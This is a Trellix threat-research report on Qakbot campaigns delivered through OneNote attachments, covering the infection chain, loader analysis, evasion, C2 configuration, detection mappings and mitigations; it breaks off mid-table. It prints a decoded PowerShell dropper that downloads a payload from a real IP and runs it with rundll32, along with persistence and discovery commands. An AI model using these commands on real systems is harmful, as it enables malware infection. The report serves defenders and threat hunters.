{
    "id": "45905517-578c-4f17-84be-f1fcc0edd6d5",
    "created_at": "2023-04-05T02:09:10.122657Z",
    "updated_at": "2025-03-27T02:16:14.300258Z",
    "deleted_at": null,
    "sha1_hash": "65ca1efcc32c2144c34420d1483fd30514917371",
    "title": "2023-03-07 - Qakbot Evolves to OneNote Malware Distribution",
    "authors": "",
    "file_creation_date": "2023-04-03T08:26:17Z",
    "file_modification_date": "2023-04-03T08:26:17Z",
    "file_size": 1416428,
    "plain_text": "# Qakbot Evolves to OneNote Malware Distribution\n\n**[trellix.com/en-us/about/newsroom/stories/research/qakbot-evolves-to-onenote-malware-distribution.html](https://www.trellix.com/en-us/about/newsroom/stories/research/qakbot-evolves-to-onenote-malware-distribution.html)**\n\nBy [Pham Duy Phuc,](https://www.trellix.com/en-us/about/newsroom/stories/contributors/pham-duy-phuc.html) [Raghav Kapoor,](https://www.trellix.com/en-us/about/newsroom/stories/contributors/raghav-kapoor.html) [John Fokker J.E.,](https://www.trellix.com/en-us/about/newsroom/stories/contributors/john-fokker.html) [Alejandro Houspanossian and](https://www.trellix.com/en-us/about/newsroom/stories/contributors/alejandro-houspanossian.html)\n[Mathanraj Thangaraju · March 07, 2023](https://www.trellix.com/en-us/about/newsroom/stories/contributors/mathanraj-tk.html)\n\n_Qakbot (aka QBot, QuakBot, and Pinkslipbot) is a sophisticated piece of malware that has_\nbeen active since at least 2007. Since the end of January 2023, there has been an upsurge\nin the number of Qakbot campaigns using a novel delivery technique: OneNote documents\nfor malware distribution. Moreover, the Trellix Advanced Research Center has detected\nvarious campaigns that used OneNote documents to distribute other malware such as\nAsyncRAT, Icedid, XWorm etc.\n\n## Brief history of Qakbot\n\nQakbot banking trojan is a sophisticated and dangerous piece of malware that has been\nactive since at least 2007. Qakbot has worm-like capabilities that allow it to propagate an\ninfected network autonomously. It is primarily used to steal sensitive information from\ninfected systems, such as login credentials and financial information, and can also be used\nto download and execute additional malware on the victim system. New functionalities have\nbeen added to include C2 communication to acquire additional malware modules and\nperform data exfiltration. Qakbot also contains multiple evasion techniques and sandbox\ndetection.\n\nThe malware is primarily spread through phishing emails and malicious attachments,\nalthough Qakbot has also been observed as a secondary payload, dropped by other botnets\nsuch as Emotet. Qakbot has been used to drop ransomware such as Prolock, Egregor and\nDoppelPaymer. It also used to be associated with TA570 which often uses the malware as\nan initial entry point in their campaigns.\n\nFigure 1 Qakbot infection rate for the last 3 months\n\n\n-----\n\nThis timeline (Figure 1) shows the global Qakbot infection rate for the last 3 months,\nhighlighting the continued threat of this dangerous malware distribution. Despite efforts to\ncombat the virus over a decade, Qakbot remains a significant risk to individuals and\norganizations worldwide as shown in Figure 2, which illustrates a global heatmap of Qakbot\ndetections. Several outbreaks of Qakbot infections have been detected in numerous\ncountries. We have seen a considerable number of infections in the United States, India,\nTurkey, and Thailand, despite the fact that these campaigns do not seem to target a specific\nindustry or country. The sector with the highest number of infected IoCs was Banking,\nFinancial, Wealth Management, followed by Government, and Outsourcing.\n\nFigure 2 Global heatmap of Qakbot detection over the last 3 months\nOver the years, Qakbot has evolved with significant changes in terms of infection vectors.\nEmail has been the preferred initial attack vector for threat actors. Recently, hijacked email\n[threats have become popular for injecting their malicious email. A report from Sophos](https://news.sophos.com/en-us/2023/02/06/qakbot-onenote-attacks/)\nindicated that malicious actors were starting to distribute spearphishing emails with malicious\nMicrosoft OneNote documents to infect users with variants from the Qakbot malware family.\n\nOur research presents an analysis of a new spreading vector of the Qakbot malware (Figure\n3). Specifically, an analysis of malicious OneNote documents that led to a Qakbot loader DLL\nand its unpacked form. We will show how we deobfuscate, unpack malicious parts and\n\n\n-----\n\nextract their configurations. Based on our investigation, we believe that the tactic of\nleveraging OneNote documents to distribute other malware variants will continue to raise.\n\nFigure 3 Threat vectors of malicious OneNote campaigns\n\n## Initial infection vector\n\nEmail has been the initial attack vector for the malware families abusing OneNote documents\nas the infection vector. Attackers have been alternating between two attack vectors in\ndifferent waves to achieve their goals:\n\n**URL embedded in email downloads the malicious file: URL based attacks were**\ncoupled with IP address and User-Agent evasion which would only serve the malicious\nfile if the User-Agent string comes from a Microsoft Windows computer. User-Agents\nfrom browsers on Mac/iOS, Linux, and Android are ignored. In addition, they employed\nschemeless URLs to avoid detection, as some analysis engines are not capable of\nidentifying and extracting these patterns.\n\n\n-----\n\n**Malicious file as email attachment (Figure 4): Attackers have used different**\nattachment types to deliver the payload. Over the time, they have used ZIP files, HTML\nfiles, PDF files, and now OneNote files. They coupled it with password protection to\nevade analysis where the password was either mentioned in the email or the file would\nbe hosted on legit services with password mentioned on the download page.\n\nFigure 4\n\nPhishing email with OneNote document as attachment\nWe have seen different variations of OneNote document being used in these campaigns:\n\n\n-----\n\nFigure 5 Screenshot of Office365 themed phishing OneNote document.\n_Figure 5 illustrates a themed phishing attack that has also been spotted in PDF attachments_\nthat lure victims to download a ZIP file containing the malware Qakbot. The specific tactics\nand indicators of compromise can be found in the Appendix.\n\nFigure 6 Screenshot of the execution of phishing OneNote document: Variation 2\nA Call-to-Action button (CTA) is present in all the OneNote documents which requires Click\nAction to execute the embedded payload. If the victim believes the fake message and clicks\non CTA button, the embedded attachment will be opened with a warning message box. Once\nthe victim clicks on \"OK\", there is no warning message anymore, and it will download and\nexecute the remote payload.\n\n\n-----\n\nFigure 7 Warning window of opening\n\nattachments in OneNote.\n\n## First-stage malware analysis: Microsoft OneNote document\n\n### Introduction to OneNote threat vector\n\nMicrosoft OneNote is a note-taking collaboration tool that allows users to capture and\norganize their thoughts, ideas, and notes. It is installed by default from the Microsoft Office\nsuite, and is available on a wide range of platforms, including Windows, macOS, Android,\nand iOS. OneNote documents are often overlooked when performing malware detection.\nEven though OneNote cannot execute VBA macros, it has significant potential for phishing\nas an initial vector. OneNote has the following advantages:\n\nOffers a formatting capability that can lure users into opening malicious files or links\nNot impacted by Office Protected View or Mark of the Web protection\nOneNote supports integration with other Microsoft Office applications, such as Outlook,\nWord, Excel, and PowerPoint which can be displayed without Protected View\nAllows for the embedding of MSF, BAT, HTA, BAT, EXE files, and other executable\nextensions\nPortability of code development through the OneNote XML objects makes it easier for\nthreat actors to automatically generate a large volume of obfuscated variants\n\nIn this research, we analyze a specific sample identified by the MD5 hash\n83feba178d0097929e6efeb27719d5db. It belongs to a Qakbot campaign which is primarily\nspread through spam email that include Office OneNote document attachments. The Trellix\nAdvanced Research Center’s Threat Intelligence Group gathers and analyzes information\nfrom multiple open and closed sources before disseminating this report.\n\nFirst-stage OneNote sample information\n\nFilename\n\n\n-----\n\nFunds_834333.one\n\nMD5\n\n83feba178d0097929e6efeb27719d5db\n\nSHA-1\n\ne50f09e56a72b14ff200b94ca583c3f9bb1112b1\n\nSHA-256\n\n033ca3aa775a34a7a4b6533b0fb744c9c71ab6\n\nFile size\n\n171 KB\n\nTo parse its information, a few free tools can help in analyzing OneNote documents such as\n[OneNoteAnalyzer,](https://github.com/knight0x07/OneNoteAnalyzer) [One-Extract,](https://github.com/volexity/threat-intel/tree/main/tools/one-extract) [Onedump.py. This specific OneNote sample contains CMD](https://blog.didierstevens.com/2023/01/22/new-tool-onedump-py/)\n(Windows Command File), which indicates that it may include executable code. Below is the\nmetadata that was extracted using OneNoteAnalyzer:\n\nFrom the extracted metadata, we notice that the attached CMD which was last saved under\nthe path \"Z:\\build\\one\" on 2/6/2023 using Microsoft OneNote 2010. The CMD payload that\ncontains the malicious payload is shown in the Code below:\n```\npowershell.exe $aV2hgYDB =\n'5d44a2b0d85aa1a4dd3f218be6422c66';\n[System.Text.Encoding]::ASCII.GetString([System.Convert]::\nFromBase64String('DQpAZWNobyBvZmYNCnNldCBhTWVXMUU9YTgweU9z\nDQpzZXQgYVRacG9MPWFxRDE4R1kNCnNldCBhZmhIZUo9YUdzSzR5VWpmDQ\npwb3dlcnNoZWxsIChuZXctb2JqZWN0IHN5c3RlbS5uZXQud2ViY2xpZW50\nKS5kb3dubG9hZGZpbGUoJ2h0dHA6Ly8yMTYuMTIwLjIwMS4xMDAvNjA4NT\nIuZGF0JywgJ0M6XHByb2dyYW1kYXRhXGdiLmpwZycpOw0Kc2V0IGFqYXM0\nYkVGPWFmd1VwUQ0Kc2V0IGE4bFdJajQ9YXhUOHV2OXANCmNhbGwgcnUlMW\nxsMzIgQzpccHJvZ3JhbWRhdGFcZ2IuanBnLFdpbmQNCmV4aXQNCg=='))\n> C:\\Users\\Public\\1.cmd&&start /min C:\\Users\\Public\\1.cmd\nnd\n\n```\n\n-----\n\nThis command launches PowerShell and sets a variable, $aV2hgYDB, to a specific value. It\nthen decodes a base64-encoded string then executes the resulting command, which\ndownloads and executes a file from a specific URL. The output of this command is redirected\nto a file named \"1.cmd\" located in the “Public” user folder, and the script then launches this\nfile, running the command contained within it. We have the following decoded Base64 code:\n```\n@echo off\nset aMeW1E=a80yOs\nset aTZpoL=aqD18GY\nset afhHeJ=aGsK4yUjf\npowershell (new-object\nsystem.net.webclient).downloadfile('http://216.120.201.100\n/60852.dat',\n'C:\\programdata\\gb.jpg');\nset ajas4bEF=afwUpQ\nset a8lWIj4=axT8uv9p\ncall ru%1ll32 C:\\programdata\\gb.jpg,Wind\n\n```\n```\nexit\n\n```\nThis script begins by turning off command echoing. It then sets several variables to specific\nvalues. The script executes a PowerShell command to download a file from a specified URL\nand save it to 'C:\\programdata\\gb.jpg'. The script executes a command to run \"rundll32\"\ncommand and the 'C:\\programdata\\gb.jpg' file as arguments along with Wind as module\nname. This will execute the file as a DLL.\n\nTo download the remote payload, the malware uses powershell (new-object\n_system.net.webclient).downloadfile which makes a request to remote host without User-_\nAgent header. We observed in other OneNote campaigns which uses cURL (is a popular\nLinux tool but it has been part of Windows 10 and later versions) and PowerShell Invoke_WebRequest. Since the malware is evolving over the time, one might want to fetch the_\nremote payload manually to monitor by executing the following command:\n\n_curl http://216.120.201.100/60852.dat -H 'User-Agent:' --output gb.jpg_\n\nThe following table is a list of recommended user-agents to reproduce according to\ndownloading techniques used by malicious payloads:\n\nTechnique\n\nRecommended User-Agent\n\n_curl_\n\n\n-----\n\ncurl/7.86.0\n\n_powerShell Invoke-WebRequest_\n\nMozilla/5.0 (Windows NT; Windows NT 10.0; de-DE)\nWindowsPowerShell/5.1.17763.316\n\n_powershell (new-object system.net.webclient).downloadfile_\n\nNo User-Agent\n\n## Second-stage malware analysis: malicious Loader DLL\n\nSecond-stage DLL static information of gb.jpg\n\nMD5\n\n891c7d5050fe852a032eeda9311498e8\n\nSHA-1\n\n52975754a7e3048c5b587e4926e99cb5c8123929\n\nSHA-256\n\ne16e0faae0e9851a782d026f6692e34a9c7bae14c545aa8ac1e1ef033dfd06a8\n\nFile size\n\n307 KB\n\nName\n\n\n-----\n\nlibKF5ItemViews.dll\n\nBuild date\n\n2010-08-17 14:54:22\n\nThis DLL contains multiple sections, including 458 exports (Figure 8), which are functions\nthat can be called by other programs. In this case, the malicious activity can only be\nexecuted via the export named \"Wind\" or its ordinary number #458, otherwise sandbox\nanalysis will fail to monitor any malicious behaviors.\n\nFigure\n\n8 DLL sections and exports\nThe entry point \"Wind\" in the DLL file is obfuscated using various evasion techniques, such\nas direct and conditional jumps (jmp, jz, jnz). It contains a shellcode that will be decrypted\nusing XOR and then executed in memory. This shellcode further decrypts the main Qakbot\nDLL, frees itself from memory and executes the main Qakbot payload in the end.\n\n[This particular sample leverages a variety of anti-debugging techniques through the PEB, so](https://anti-debug.checkpoint.com/techniques/debug-flags.html)\nit is recommended that analysts utilize anti-evasion solutions when configuring the debugger\nenvironment (as depicted in the Figure 9).\n\nFigure 9 Recommended setup for anti-debugging flags.\n\nThe Qakbot’s DLL that is dumped from memory has its sections misaligned, requiring analyst\nto correct the section addresses and size within the file header to their proper values (as\nshown in the Figure 10).\n\n\n-----\n\nFigure 10 Correct header alignment.\n\n## Third-stage malware analysis: Qakbot Core DLL\n\n[There are already numerous detailed reports such as from our research team or](https://www.trellix.com/en-us/about/newsroom/stories/research/demystifying-qbot-malware.html) [others](https://www.elastic.co/security-labs/qbot-malware-analysis)\n[available about this Qakbot variant’s behavior and techniques, which provide in-depth](https://www.elastic.co/security-labs/qbot-malware-analysis)\nanalysis of its capabilities and modus operandi. Our focus is presenting the key findings\nrelated to this sample: String obfuscation, Persistence, Evasion techniques and C2\ncommunication, rather than duplicating the information that is already readily available in the\nstate of the art.\n\n### String obfuscation\n\nMost of the significant string values in the malware binary have been encrypted therefore\nnothing will be returned from static analysis tools such as strings, however they can be\ndecrypted using static extraction. The encrypted strings and keys are hardcoded in four\nseparate locations that are loaded onto the stack or register, and then called to function at\n_0x100019D4 and 0x10009388 to decrypt them. The decryption function accepts one_\nargument which is the index of requested string.\n```\n; void *__cdecl sub_100019A6 (unsigned int index)\nsub_100019A6 proc near\nindex= dword ptr 8\npush ebp\nmov ebp, esp\npush [ebp+index]\nmov edx, 57Dh\npush ecx\npush offset key_blob_1\nmov ecx, offset enc_blob_1\ncall sub_1000A0A6\nadd esp, 0Ch\npop ebp\nretn\nsub 100019A6 endp\n\n```\n\n-----\n\nTable 1. Decryption function that takes index input from stack\n```\nsub_1000198C proc near\npush ecx\npush ecx\npush offset key_blob_1\nmov edx, 57Dh\nmov ecx, offset enc_blob_1\ncall sub_1000A0CC\nadd esp, 0Ch\nretn\n\n```\n```\nsub_1000198C endp\n\n```\nTable 2 Decryption function that takes index input from register\n\nBy simply XOR between the two encrypted blobs and keys, we will accomplish the two\ndecrypted continuous string blobs. Based on the decrypted strings and disassembled code,\nthe following sections will present key features of this Qakbot variant.\n\n### Persistence\n\n\"%s\\system32\\schtasks.exe\" /Create /ST %02u:%02u /RU \"NT AUTHORITY\\SYSTEM\"\n/SC ONCE /tr \"%s\" /Z /ET %02u:%02u /tn %s\n\nschtasks.exe /Create /RU \"NT AUTHORITY\\SYSTEM\" /SC ONSTART /TN %u /TR \"%s\"\n/NP /F\n\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\nThe execution of the above commands demonstrates the persistence mechanism employed\nby the malware. The first line creates a scheduled task using the Windows built-in tool\n\"schtasks.exe\". The task is set to run only once at a specified time, as specified by the \"/ST\n_%02u:%02u\" and \"/ET %02u:%02u\" parameters. The task is executed with the highest_\nprivileges using the \"NT AUTHORITY∖SYSTEM\" user, as specified by the \"/RU\" parameter.\nThe task command, \"%s\", is passed as an argument via the \"/tr\" parameter. The \"/Z\"\nparameter ensures that the task continues to run even if the user logs off. The task is given a\nname, specified by the \"/tn %s\" parameter.\n\nThe second line is set to run at every system start, as specified by the \"/SC ONSTART\"\nparameter. The \"/NP\" parameter ensures that the task is not prompted for administrative\nprivileges, while the \"/F\" parameter forces the task to be created, even if a task with the\nsame name already exists.\n\nThis sample either creates scheduled tasks or creates registry run key in\n_SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run._\n\n### Process injection\n\n\n-----\n\nWhen the DLL payload is executed, it will inject its malicious code to a legitimate Windows\nOS process to perform defense evasion. Figure 11 shows the code and how it creates a\nsuspended process (the wermgr.exe) as the first step of the process hollowing technique.\n\nFigure 11 Dynamic analysis: process tree.\n\nBelow is the list of processes that can be injected by the Qakbot core .DLL during its\nexecution:\n\n%SystemRoot%\\System32\\wermgr.exe\n%SystemRoot%\\SysWOW64\\OneDriveSetup.exe\n%SystemRoot%\\System32\\xwizard.exe\n%SystemRoot%\\System32\\msra.exe\n%SystemRoot%\\System32\\dxdiag.exe\n%SystemRoot%\\SysWOW64\\xwizard.exe\n%SystemRoot%\\System32\\AtBroker.exe\n%SystemRoot%\\SysWOW64\\mobsync.exe\n%SystemRoot%\\SysWOW64\\wermgr.exe\n%SystemRoot%\\SysWOW64\\AtBroker.exe\n%SystemRoot%\\explorer.exe\n%SystemRoot%\\System32\\OneDriveSetup.exe\n%SystemRoot%\\SysWOW64\\CertEnrollCtrl.exe\n%SystemRoot%\\SysWOW64\\msra.exe\n%SystemRoot%\\SysWOW64\\dxdiag.exe\n%SystemRoot%\\System32\\CertEnrollCtrl.exe\n%SystemRoot%\\System32\\mobsync.exe\n%SystemRoot%\\SysWOW64\\explorer.exe\nTable 3 List of processes that can be injected by the Qakbot core.\n\n## Evasion techniques\n\n### Anti-debugging\n\nThe code in Table 4 shows the code snippet that verifies if this sample is being debugged\nusing the PEB Structure’s BeingDebugged. If it detects the flag, it will XOR the 2 decryption\nkey tables with 0xB8 to destroy itself then exit its process\n```\nint__thiscallsub_100026E5(void* this,intal){\nunsigned intv3; // eax\nunsigned inti; // ecx\nif(sub_1000BDB3(this) == -1) {\nwhile(1){\nif(sub 1000F297() > 0) {\n\n```\n\n-----\n\n```\nsub_1000BEAC(63, 1);\nreturn0;\n}\nif(NtCurrentPeb() -> BeingDebugged)\nbreak;\n( * (void(__stdcall**)(int,int))(dword_10020D98 +200))\n(1000,1\nv3 =0;\nfor(i=0; i <0x80; ++i)\nkey_blob_2[i] ^=0xB8u;\ndo\nkey_blob_1[v3++] ^= 0xB8u;\nwhile(v3 >0x80\nreturn 0;\n}\n\n```\nTable 4 Anti debugging using PEB Being Debugged\n\n### Anti-dynamic analysis\n\nThis malware checks whether there are running processes in a block list, including:\n\nfrida-winjector-helper-32.exe\n\nidaq64.exe\n\nfrida-winjector-helper-64.exe\n\nloaddll32.exe\n\ntcpdump.exe\n\nPETools.exe\n\nwindump.exe\n\nImportREC.exe\n\nethereal.exe\n\n\n-----\n\nLordPE.exe\n\nwireshark.exe\n\nSysInspector.exe\n\nettercap.exe\n\nproc_analyzer.exe\n\nrtsniff.exe\n\nsysAnalyzer.exe\n\npacketcapture.exe\n\nsniff_hit.exe\n\ncapturenet.exe\n\njoeboxcontrol.exe\n\nqak_proxy\n\njoeboxserver.exe\n\ndumpcap.exe\n\nResourceHacker.exe\n\nCFF Explorer.exe\n\nx64dbg.exe\n\n\n-----\n\nnot_rundll32.exe\n\nFiddler.exe\n\nProcessHacker.exe\n\nsniff_hit.exe\n\ntcpview.exe\n\nprocmon.exe\n\nfilemon.exe\n\nsysAnalyzer.exe\n\n### Anti AVs\n\nThe malware payload checks for Windows Defender Emulation using WinAPI\nGetFileAttributes of “C:\\INTERNAL\\__empty”. It verifies a list of processes that are related to\nantivirus products such as Kaspersky, Sentinel, AVG, Dr. Web, Fortinet, TrendMicro, FSecure, ByteFence Anti-Malware, BitDefender, Avast, Windows Defender, Comodo Internet\nSecurity, ESET, etc.\n\nAvastSvc.exe;aswEngSrv.exe;aswToolsSvc.exe;afwServ.exe;aswidsagent.exe;AvastUI.exe\nCynetEPS.exe;CynetMS.exe;CynetConsole.exe\navp.exe;kavtray.exe\nSentinelServiceHost.exe;SentinelStaticEngine.exe;SentinelAgent.exe;\nSentinelStaticEngineScanner.exe;SentinelUI.exe\nccSvcHst.exe;NortonSecurity.exe;nsWscSvc.exe\ncoreServiceShell.exe;PccNTMon.exe;NTRTScan.exe\nvkise.exe;isesrv.exe;cmdagent.exe\nMBAMService.exe;mbamgui.exe\navgcsrvx.exe;avgsvcx.exe;avgcsrva.exe\nCSFalconService.exe;CSFalconContainer.exe\nbdagent.exe;vsserv.exe;vsservppl.exe\nxagtnotif.exe;AppUIMonitor.exe\n\n\n-----\n\negui.exe;ekrn.exe\nSophosUI.exe;SAVAdminService.exe;SavService.exe\ndwengine.exe;dwarkdaemon.exe;dwwatcher.exe\n\n### C2 communication\n\nIn the Qakbot encryption/decryption process, the core DLL has two resources - one for the\nencrypted Configuration and one for the encrypted C2 IPs list. To decrypt these resources,\nthe SHA1 Hash is computed on a certain string that is particular to each Qakbot sample, and\nthat hash is used as the key for the RC4 algorithm.\n\nFigure\n\n12 Encrypted configuration values in the DLL resources.\nThe first decryption using the RC4 technique with a hard-coded key\n“bUdiuy81gYguty@4frdRdpfko(eKmudeuMncueaN” yields the following data:\n\nFrom bytes 0 to 20: SHA1 Hash of second Key with encrypted configuration\nFrom bytes 20 to 40: Second Key\nFrom bytes 40: Encrypted Configuration\n\nThe second key is then used as the input for the second RC4 decryption to retrieve the\ndecrypted configuration.\n\nAfter decryption, we found that the campaign ID for this Qakbot is \"tok01\" and the timestamp\nis \"1676453967 \" which corresponds to February 15, 2023. All extracted C2 (IP:port) can be\nfound in Appendix table 2. Most of these addresses belong to other infected systems that are\n[used as a proxy to forward traffic to additional proxies or the actual C2.](https://securelist.com/qakbot-technical-analysis/103931/)\n\nQakbot has been known to use a few modules during its infection chain, most notably:\n\nSystem information collection: In addition to general system information such as OS\nversion, username, computer name, domain, screen resolution, system time, system\nuptime and bot uptime, it also contains the results of the installed applications and WMI\nqueries are collected.\nFetching remote plugins: Qakbot has at least few known different plugins: Password\ngrabber, Cookie grabber, UPnP module, Hidden VNC, Email Collector, Hooking\nmodule, Proxy module, Web inject.\n\n## Threat Detection Strategies\n\nThis section is mainly targeted to security teams working on detection engineering and threat\nhunting. It consists of campaign’s key behaviours, detection opportunities, and mitigations.\n\n\n-----\n\n### Key Behaviors (TTPs)\n\nThis is a list of some of the threat behaviors that can be leveraged for detection.\n\nTactical Goal\n\nATT&CK Technique (Technique ID)\n\nThreat Actions/Behaviors\n\nInitial Access\n\nPhishing: Spearphishing Attachment (T1566.001)\n\nThreat actor lured user to open malicious email with malicious OneNote file as attachment\n(.one file extension).\n\nExecution\n\nUser Execution: Malicious File (T1204.002)\n\nUser opened malicious OneNote file attachment.\n\nExecution\n\nUser Execution: Malicious Link (T1204.001)\n\nUser clicks on malicious link included in the OneNote file\n\nDefense Evasion\n\nSystem Binary Proxy Execution: MSHTA (T1218.005)\n\nOneNote spawns MSHTA to execute embedded .HTA file.\n\n\n-----\n\nCommand And Control\n\nIngress Tool Transfer (T1105)\n\nMSHTA spawns cURL to download 2nd stage payload.\n\nDefense Evasion\n\nSystem Binary Proxy Execution: RunDll32 (T1218.011)\n\nIt spawns RunDll32 to execute 2nd stage payload.\n\nDefense Evasion\n\nProcess Injection: Process Hollowing (T1055.012)\n\nRunDll32 (Qbot) spawns and injects into a Windows System Process (e.g., wermgr.exe).\n\nDiscovery\n\nSystem Information Discovery (T1082)\nSecurity Software Discovery (T1518.001)\nWindows Management Instrumentation (T1047)\n\nInjected Windows System Process (e.g., wermgr.exe) executes discovery commands via\nWMI.\n\nDiscovery\n\nSystem Information Discovery (T1082)\nSystem Owner/User Discovery (T1033)\nDomain Trust Discovery (T1482)\nSystem Network Connections Discovery (T1049)\nWindows Command Shell (T1059.003)\n\n\n-----\n\nInjected Windows System Process (e.g., wermgr.exe) executes discovery commands via\nCMD.\n|_ net view\n|_ cmd /c set\n|_ arp -a\n|_ ipconfig /all\n|_ nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.{DOMAIN}\n|_ nltest /domain_trusts /all_trusts\n|_ net share\n|_ route print\n|_ netstat -nao\n|_ net localgroup\n|_ qwinsta\n|_ whoami /all\n\nPersistence\n\nScheduled Tasks (T1053)\n\nWindows System Process (e.g., wermgr.exe) stablishes persistence via scheduled tasks.\n\nPersistence\n\nBoot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001)\n\nWindows System Process (e.g., wermgr.exe) stablishes persistence via autorun registry\nkeys.\n\n### Detection Opportunities\n\nThis is a mapping of Detection Opportunities to Threat Behaviours, Analysis Methods\n[(D3FEND ) and](https://d3fend.mitre.org/) [ATT&CK techniques.](https://attack.mitre.org/matrices/enterprise/)\n\nDefense Goal\n\nThreat Actions vs Detection Opportunities\n\n\n-----\n\nAnalysis Methods\n\nATT&CK Technique (Technique ID)\n\nDetect Suspicious Process Execution (Genealogy)\n\nOutlook spawns MSHTA/CMD\nMSHTA spawns cURL\nMSHTA/CMD spawns RunDll23\nRunDll32 spawns Windows System Binary\nWindows System Binary spawns cmd.exe\nWindows System Binary spawns schtasks.exe\n\nProcess Spawn Analysis\n\nUser Execution: Malicious File (T1204.002)\nSystem Binary Proxy Execution: MSHTA (T1218.005)\nSystem Binary Proxy Execution: RunDll32 (T1218.011)\nWindows Command Shell (T1059.003)\nScheduled Tasks (T1053)\n\nDetect Suspicious Process Injection Attempts\n\nRunDll32 injects Windows System Binary\n\nProcess Spawn Analysis\nSystem Call Analysis\n\nIngress Tool Transfer (T1105)\n\nDetect Suspicious Network Connection Attempts\n(Network Connection Events)\n\nWindows System Binary connects to public IP\n\nConnection Attempt Analysis\n\n\n-----\n\nIngress Tool Transfer (T1105)\nApplication Layer Protocol: Web Protocols (T1071.001)\n\nDetect Suspicious Sequence of Commands\n(Process Created Events)\n\nWindows System Binary spawns sequence of discovery commands\n\nCommand Execution Analysis\n\nSystem Information Discovery (T1082)\nDomain Trust Discovery (T1482)\nSystem Network Connections Discovery (T1049)\nWindows Command Shell (T1059.003)\n\nNote: In this analysis, the references to Outlook, OneNote, MSHTA, RunDll32, Cmd, schtask,\nwermgr refer to legit system binaries running from their expected paths.\n\n## Prevention and Mitigation\n\n[On top of CISA’s counter-phishing recommendations, we recommend the following](https://www.cisa.gov/sites/default/files/publications/Capacity_Enhancement_Guide-Counter-Phishing_Recommendations_for_Federal_Agencies.pdf)\nprevention and mitigation countermeasures against this campaign:\n\n1. Block emails with attachments with uncommon file extensions (.one, .hta, .vbs, .js, .wsf,\n\n.iso, .vhd, .img) [SECURE EMAIL GATEWAY CAPABILITIES]\n2. Block known malicious sites [OUTBOUND WEB-BROWSING PROTECTIONS]\n3. Block rarely used top-level domains [OUTBOUND WEB-BROWSING PROTECTIONS]\n4. Block network connections initiated by commonly abused system binaries (e.g.,\n\nMSHTA.exe, RunDll32.exe, cmd.exe) [OUTBOUND WEB-BROWSING\nPROTECTIONS]\n5. Change default file associations for script file formats that are uncommon in your\n\nenvironment (e.g,: .wsf, .js, .hta, .vba, .chm, .cmd) [ENDPOINT PROTECTIONS]\n6. Block PE File Creation on paths commonly used by malware (e.g,:\n\n%PROGRAMDATA%) [ENDPOINT PROTECTIONS]\n\n## Threat intelligence\n\n\n-----\n\nRecent Qakbot OneNote variant leverages the trick of using U+202E in attached filename. It\ninvolves the use of the Right-to-Left Override character which is used to flip the direction of\ntext from left-to-right to right-to-left. The attached filename that appears to be legitimate but is\nactually malicious. For example, a file named \"tempeno.hta\" could be renamed to\n\"tempath.one\" by using this technique, which could potentially trick users into opening the\nfile, believing it to be a OneNote document (Figure 13).\n\nFigure 13 U+202E trick in attached file name.\n[Sevagas introduced the usage of OneNote in red teaming for the first time in August 2022.](https://blog.sevagas.com/?RedTeam-With-OneNote)\nThereafter, the distribution of malware via Microsoft OneNote documents in email is on the\nrise, with various cybercriminal threat actors utilizing this method. Most of these campaigns\nare broadly targeted, with a high volume of email phishing sent out. These attacks have\nimpacted organizations globally, including those in North America and Europe, with TA577\nreturning from a break in activity and using OneNote to deliver Qakbot at the end of January\n[2023 . To gain a deeper understanding of the distribution of malware via Microsoft OneNote](https://www.proofpoint.com/us/blog/threat-insight/onenote-documents-increasingly-used-to-deliver-malware)\ndocuments, we conducted a comprehensive analysis of our telemetry data (see Figure 14).\nMonitoring phishing emails with attachments or links leading to OneNote papers was our\ninitial step. We further extracted all payloads from the OneNote documents and examined\ntheir techniques for capturing remote malicious payloads and understanding their threat\nvectors. By investigating these insights, we aimed to gain a more in-depth understanding of\nthe threats posed by malware distributed via OneNote documents.\n\nFigure 14 Workflow of malware payloads extraction from OneNote malware distribution\ncampaigns.\nMalicious OneNote documents have been a growing concern in recent months. One of the\nfirst malicious campaigns that used OneNote document was PoC scripts that included PE\nbinary (KrbRelayUp) inside the document\n(1dc133f24649611277716350f9d63ccd7c30cec27b9b4b7c62f6bbfe395acfac) since June\n2022, or embedded HTA that downloads remote PowerShell scripts to install PoshC2 in midNovember 2022\n(1ff8e47def1e557b14470f95215d8763876f28411d4cf4fc7319c077733acd63).\n\nMalicious OneNote documents have been a growing concern in recent months. One of the\nfirst malicious campaigns that used OneNote document was PoC scripts that included PE\nbinary (KrbRelayUp) inside the document\n\n\n-----\n\n(1dc133f24649611277716350f9d63ccd7c30cec27b9b4b7c62f6bbfe395acfac) since June\n2022, or embedded HTA that downloads remote PowerShell scripts to install PoshC2 in midNovember 2022\n(1ff8e47def1e557b14470f95215d8763876f28411d4cf4fc7319c077733acd63).\n\nFigure\n\n15 Phishing OneNote document since November 2022 targeted NedBank\nHowever, the number of malicious OneNote samples has been gradually increasing since\nDecember 2022-January 2023, by counting the files collected up to February 16, 2023\n(Figure 16). Additionally, a portion of the benign OneNote samples are decoy files samples\nthat are downloaded by users upon executing the malicious OneNote files. Furthermore, the\nnumber of benign OneNote samples that are used as decoy files downloaded by users upon\nexecuting the malicious files are increasing as well. This trend shows that the ratio of\nmalicious OneNote samples is heavily increasing.\n\nFigure 16 Malicious OneNote detection since 01/2023.\nFigure 17 illustrates a chart of malicious OneNote detections in 2023. These outbreaks have\nbeen reported in various countries, including the United States, South Korea, and Germany,\nand have impacted a wide range of industries.\n\n\n-----\n\nFigure 17 Detected malicious OneNote events in 2023 across countries.\nTo gain deeper insights into the statistics of detection across industries, we analyzed the\ninfected indicators of compromise. The results (Figure 18) indicate that the manufacturing,\nhigh-tech, and telecom sectors have the highest number of infected IoCs. This suggests that\nthese industries may be more vulnerable to these types of attacks and need to take proactive\nmeasures to protect their systems and networks from potential threats.\n\n\n-----\n\nFigure 18 Detected OneNote events in 2023 across industries.\nIn addition, various threat actors have started to use OneNote documents to distribute\nmalware. In December 2002, we detected campaigns that used PowerShell in OneNote\ndocument to download the remote AsyncRAT payload. Since the end of January 2023, there\nhas been an upsurge in the number of Qakbot campaigns using OneNote documents for\nmalware distribution. Recently, we detected Onenote document started to drop Icedid\nmalware using the same tactic. We have been tracking down some of the campaigns as\nlisted below:\n\nVersion\n\nCampaign\n\nTimestamp\n\nConverted timestamp\n\n404.432\n\n\n-----\n\nobama235\n\n1675240891\n\nFebruary 1, 